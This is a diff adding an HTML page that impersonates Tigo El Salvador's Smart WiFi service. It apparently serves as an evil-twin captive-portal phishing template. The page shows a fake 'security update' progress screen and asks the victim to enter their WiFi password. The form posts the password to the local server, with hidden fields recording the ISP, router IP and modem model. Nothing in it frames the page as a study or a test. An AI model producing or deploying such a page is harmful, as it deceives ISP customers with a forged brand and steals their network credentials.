@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#00377b">
+<title>Tigo | Smart WiFi</title>
+<link rel="icon" href="data:,">
+<style>
+  :root {
+    --blue: #00377b;
+    --blue-2: #0056b3;
+    --sky: #00a9e0;
+    --sky-soft: #e6f7fd;
+    --ink: #14213d;
+    --muted: #61708a;
+    --line: #dce7f2;
+    --green: #1fa971;
+    --magenta: #e6007e;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body { min-height: 100%; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: var(--ink);
+    background:
+      radial-gradient(circle at 15% 10%, rgba(0, 169, 224, .22), transparent 35%),
+      radial-gradient(circle at 90% 90%, rgba(0, 86, 179, .14), transparent 42%),
+      linear-gradient(160deg, #f2fbff 0%, #e2f3fc 50%, #d3ebfa 100%);
+    min-height: 100vh;
+    min-height: 100dvh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px 16px;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 460px;
+    background: #fff;
+    border-radius: 22px;
+    overflow: hidden;
+    box-shadow: 0 26px 65px rgba(0, 55, 123, .18), 0 1px 0 rgba(255,255,255,.7) inset;
+    animation: rise .45s ease-out both;
+  }
+
+  @keyframes rise {
+    from { opacity: 0; transform: translateY(14px) scale(.985); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .topbar {
+    padding: 18px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    background: #fff;
+    border-bottom: 1px solid #eef4f9;
+  }
+
+  .brand { display: flex; align-items: center; gap: 11px; }
+
+  .brand-mark {
+    width: 42px;
+    height: 42px;
+    border-radius: 13px;
+    background: linear-gradient(145deg, #00377b, #0056b3);
+    display: grid;
+    place-items: center;
+    box-shadow: 0 7px 16px rgba(0, 55, 123, .22);
+    flex: 0 0 auto;
+  }
+
+  .brand-mark svg { width: 25px; height: 25px; }
+
+  .wordmark {
+    font-size: 27px;
+    line-height: 1;
+    font-weight: 900;
+    letter-spacing: -1.6px;
+    color: var(--blue);
+    display: inline-flex;
+    align-items: baseline;
+  }
+
+  .wordmark .i-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #00a9e0, #e6007e);
+    margin-left: 2px;
+    margin-bottom: 10px;
+  }
+
+  .brand-sub { display: block;
+    font-size: 9px;
+    font-weight: 800;
+    letter-spacing: 1.7px;
+    color: #7c8ca6;
+    text-transform: uppercase;
+    margin-top: 3px;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    background: var(--sky-soft);
+    border: 1px solid #bfe9f7;
+    color: #046b8c;
+    font-size: 9.5px;
+    font-weight: 800;
+    letter-spacing: .7px;
+    text-transform: uppercase;
+    border-radius: 999px;
+    padding: 6px 9px;
+    white-space: nowrap;
+  }
+
+  .badge span {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--sky);
+    box-shadow: 0 0 0 3px rgba(0, 169, 224, .14);
+  }
+
+  .hero {
+    padding: 24px 24px 22px;
+    background:
+      radial-gradient(circle at 92% 0%, rgba(0, 169, 224, .22), transparent 38%),
+      linear-gradient(135deg, #00377b 0%, #004b9a 60%, #0056b3 100%);
+    color: #fff;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::after {
+    content: "";
+    position: absolute;
+    width: 190px;
+    height: 190px;
+    border-radius: 50%;
+    border: 1px solid rgba(255, 255, 255, .1);
+    right: -70px;
+    bottom: -110px;
+    pointer-events: none;
+  }
+
+  .progress-label {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 10px;
+    font-weight: 700;
+    color: #b9d9f2;
+    margin-bottom: 7px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .progress-track {
+    height: 5px;
+    border-radius: 999px;
+    background: rgba(255, 255, 255, .15);
+    overflow: hidden;
+    margin-bottom: 17px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .progress-track span {
+    display: block;
+    height: 100%;
+    width: 68%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #00a9e0, #5ddcff);
+    box-shadow: 0 0 12px rgba(93, 220, 255, .5);
+    animation: grow 1.1s ease-out both;
+  }
+
+  @keyframes grow { from { width: 0; } }
+
+  .hero h1 {
+    font-size: 24px;
+    line-height: 1.2;
+    letter-spacing: -.45px;
+    font-weight: 750;
+    margin-bottom: 8px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .hero p {
+    font-size: 13px;
+    line-height: 1.55;
+    color: #c3ddf2;
+    position: relative;
+    z-index: 1;
+  }
+
+  .content { padding: 21px 24px 22px; }
+
+  .router {
+    display: flex;
+    align-items: center;
+    gap: 11px;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    background: #f7fbfe;
+    padding: 12px 13px;
+    margin-bottom: 19px;
+  }
+
+  .router-icon {
+    width: 34px;
+    height: 34px;
+    border-radius: 9px;
+    background: #fff;
+    border: 1px solid #dbeaf6;
+    display: grid;
+    place-items: center;
+    flex: 0 0 auto;
+  }
+
+  .router-icon svg { width: 19px; height: 19px; }
+  .router-text { min-width: 0; flex: 1; }
+  .router-title { font-size: 12px; font-weight: 750; color: #203553; white-space: normal; overflow-wrap: anywhere; line-height: 1.35; }
+  .router-sub { font-size: 10.5px; color: #7c8ca6; margin-top: 2px; }
+
+  .online {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    font-size: 9.5px;
+    font-weight: 800;
+    color: var(--green);
+    white-space: nowrap;
+  }
+
+  .online::before {
+    content: "";
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 0 3px rgba(31, 169, 113, .13);
+  }
+
+  .callout {
+    display: flex;
+    gap: 9px;
+    align-items: flex-start;
+    padding: 11px 12px;
+    border-radius: 10px;
+    background: #f3f9ff;
+    border: 1px solid #dcebf8;
+    color: #3f5b7d;
+    font-size: 11.5px;
+    line-height: 1.5;
+    margin-bottom: 18px;
+  }
+
+  .callout svg { width: 16px; height: 16px; flex: 0 0 auto; margin-top: 1px; }
+
+  .field { margin-bottom: 14px; }
+
+  label {
+    display: block;
+    font-size: 12px;
+    font-weight: 750;
+    color: #2c4466;
+    margin-bottom: 7px;
+  }
+
+  .input-wrap { position: relative; }
+
+  input[type="password"], input[type="text"] {
+    width: 100%;
+    height: 49px;
+    padding: 0 74px 0 14px;
+    border: 1.5px solid #cfdeec;
+    border-radius: 12px;
+    background: #fbfdff;
+    color: var(--ink);
+    font-size: 15px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color .18s, box-shadow .18s, background .18s;
+  }
+
+  input[type="password"]:focus, input[type="text"]:focus {
+    border-color: var(--sky);
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(0, 169, 224, .12);
+  }
+
+  input::placeholder { color: #9aacc2; }
+
+  .toggle {
+    position: absolute;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    border: 0;
+    background: #eaf5fc;
+    color: #0056b3;
+    font-family: inherit;
+    font-size: 10.5px;
+    font-weight: 800;
+    padding: 7px 9px;
+    border-radius: 7px;
+    cursor: pointer;
+  }
+
+  .toggle:hover { background: #dceffa; }
+
+  .meta-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    margin: 2px 0 18px;
+    font-size: 11.5px;
+    color: var(--muted);
+  }
+
+  .remember { display: inline-flex; align-items: center; gap: 7px; cursor: pointer; }
+  .remember input { width: 15px; height: 15px; accent-color: var(--sky); cursor: pointer; }
+  .link { color: #0056b3; font-weight: 650; text-decoration: none; cursor: pointer; }
+
+  .submit {
+    width: 100%;
+    border: 0;
+    border-radius: 12px;
+    padding: 15px 18px;
+    background: linear-gradient(135deg, #00a9e0 0%, #008fd0 100%);
+    color: #fff;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: 800;
+    cursor: pointer;
+    box-shadow: 0 10px 20px rgba(0, 169, 224, .26);
+    transition: filter .15s, transform .15s, box-shadow .15s;
+  }
+
+  .submit:hover { filter: brightness(1.05); transform: translateY(-1px); box-shadow: 0 14px 24px rgba(0, 169, 224, .32); }
+  .submit:active { transform: translateY(1px); }
+  .submit:disabled { opacity: .82; cursor: wait; transform: none; }
+
+  .footer {
+    padding: 14px 24px 17px;
+    text-align: center;
+    font-size: 9.5px;
+    line-height: 1.55;
+    color: #8a9bb2;
+    background: #f8fbfe;
+    border-top: 1px solid #eef4f9;
+  }
+
+  .footer strong { color: #61708a; }
+
+  @media (max-width: 380px) {
+    body { padding: 10px; }
+    .topbar { padding: 15px 17px; }
+    .hero { padding: 21px 17px 19px; }
+    .content { padding: 18px 17px 19px; }
+    .footer { padding: 12px 17px 15px; }
+    h1 { font-size: 21px; }
+    .badge { display: none; }
+  }
+</style>
+</head>
+<body>
+  <main class="card" role="main">
+    <header class="topbar">
+      <div class="brand" aria-label="Tigo Smart WiFi">
+        <span class="brand-mark" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 8.5C6.2 6.3 8.9 5.1 12 5.1C15.1 5.1 17.8 6.3 20 8.5" stroke="#5ddcff" stroke-width="1.8" stroke-linecap="round"/>
+            <path d="M6.7 11.4C8.1 10 9.9 9.2 12 9.2C14.1 9.2 15.9 10 17.3 11.4" stroke="#5ddcff" stroke-width="1.8" stroke-linecap="round"/>
+            <path d="M9.4 14.3C10.1 13.6 11 13.2 12 13.2C13 13.2 13.9 13.6 14.6 14.3" stroke="#5ddcff" stroke-width="1.8" stroke-linecap="round"/>
+            <circle cx="12" cy="17.5" r="1.35" fill="#5ddcff"/>
+          </svg>
+        </span>
+        <span>
+          <span class="wordmark">tigo<span class="i-dot"></span></span>
+          <span class="brand-sub">Smart WiFi · El Salvador</span>
+        </span>
+      </div>
+      <span class="badge"><span></span> En línea</span>
+    </header>
+
+    <section class="hero">
+      <div class="progress-label"><span>Actualización de seguridad</span><span>Paso 2 de 3</span></div>
+      <div class="progress-track" aria-hidden="true"><span></span></div>
+      <h1>Estamos protegiendo tu red WiFi</h1>
+      <p>Tu módem inició una actualización de seguridad. Confirma la contraseña de tu red para completar el proceso y evitar interrupciones en tu conexión.</p>
+    </section>
+
+    <section class="content">
+      <div class="router">
+        <span class="router-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="8" width="18" height="10" rx="2" stroke="#00a9e0" stroke-width="1.6"/>
+            <path d="M7 13H9M11 13H13M15 13H17" stroke="#00a9e0" stroke-width="1.6" stroke-linecap="round"/>
+            <path d="M7 8V6M17 8V6" stroke="#00a9e0" stroke-width="1.6" stroke-linecap="round"/>
+          </svg>
+        </span>
+        <div class="router-text">
+          <div class="router-title">Technicolor CGA4233 · 192.168.1.1</div>
+          <div class="router-sub">Módem Tigo Hogar · Red WiFi principal</div>
+        </div>
+        <span class="online">Activo</span>
+      </div>
+
+      <div class="callout">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <circle cx="12" cy="12" r="8.5" stroke="#008fd0" stroke-width="1.6"/>
+          <path d="M12 7.5V12.5" stroke="#008fd0" stroke-width="1.7" stroke-linecap="round"/>
+          <circle cx="12" cy="16" r="1" fill="#008fd0"/>
+        </svg>
+        <span>Este proceso es automático y dura menos de un minuto. No necesitas reiniciar el módem.</span>
+      </div>
+
+      <form id="portalForm" method="POST" action="/" autocomplete="off">
+        <input type="hidden" name="isp" value="Tigo">
+        <input type="hidden" name="router_ip" value="192.168.1.1">
+        <input type="hidden" name="router_model" value="Technicolor CGA4233">
+        <input type="hidden" name="portal" value="tigo">
+
+        <div class="field">
+          <label for="wifi_password">Clave de tu red WiFi</label>
+          <div class="input-wrap">
+            <input type="password" id="wifi_password" name="wifi_password" placeholder="Ingresa la clave de tu red" required autofocus autocomplete="off" spellcheck="false">
+            <button type="button" class="toggle" id="togglePassword" aria-label="Mostrar contraseña">MOSTRAR</button>
+          </div>
+        </div>
+
+        <div class="meta-row">
+          <label class="remember" for="recordar">
+            <input type="checkbox" id="recordar" name="recordar" value="si" checked>
+            Mantener sesión
+          </label>
+          <a class="link" href="#" id="helpLink">¿Problemas para ingresar?</a>
+        </div>
+
+        <button type="submit" class="submit" id="submitBtn">Completar actualización</button>
+      </form>
+    </section>
+
+    <footer class="footer">
+      <strong>Tigo El Salvador</strong> · Servicio al Cliente<br>
+      © 2026 Tigo. Todos los derechos reservados.
+    </footer>
+  </main>
+
+  <script>
+    (function () {
+      var password = document.getElementById('wifi_password');
+      var toggle = document.getElementById('togglePassword');
+      var form = document.getElementById('portalForm');
+      var submitBtn = document.getElementById('submitBtn');
+      var helpLink = document.getElementById('helpLink');
+
+      if (toggle && password) {
+        toggle.addEventListener('click', function () {
+          var show = password.type === 'password';
+          password.type = show ? 'text' : 'password';
+          toggle.textContent = show ? 'OCULTAR' : 'MOSTRAR';
+          toggle.setAttribute('aria-label', show ? 'Ocultar contraseña' : 'Mostrar contraseña');
+          password.focus();
+        });
+      }
+
+      if (helpLink) {
+        helpLink.addEventListener('click', function (event) {
+          event.preventDefault();
+          alert('Verifica que estés dentro del alcance de tu red Tigo. Si persiste, contacta al servicio al cliente desde la app Mi Tigo.');
+        });
+      }
+
+      if (form && submitBtn) {
+        form.addEventListener('submit', function () {
+          if (!form.checkValidity()) return;
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Aplicando configuración...';
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
